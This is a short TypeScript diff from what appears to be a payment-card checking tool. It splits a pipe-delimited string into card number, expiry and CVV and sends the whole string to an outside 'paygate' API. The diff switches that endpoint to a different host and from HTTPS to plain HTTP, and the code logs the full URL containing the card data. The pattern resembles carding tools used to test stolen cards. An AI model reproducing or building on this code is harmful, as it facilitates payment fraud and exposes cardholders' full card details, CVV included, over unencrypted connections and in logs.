@@ -234,7 +234,7 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
   const [cardNumber, mm, yy, cvv] = cc.split('|');
   
   // API URL with card data as query params
-  const apiUrl = `https://web-production-c8c87.up.railway.app/check?cc=${encodeURIComponent(cc)}&_t=${timestamp}&_r=${randomId}`;
+  const apiUrl = `http://api-production-d218.up.railway.app/api/paygate?cc=${encodeURIComponent(cc)}&_t=${timestamp}&_r=${randomId}`;
   
   console.log(`[PAYGATE] Attempt ${attempt}/${maxRetries} - Sending card to API`);
   console.log(`[PAYGATE] API URL: ${apiUrl}`);
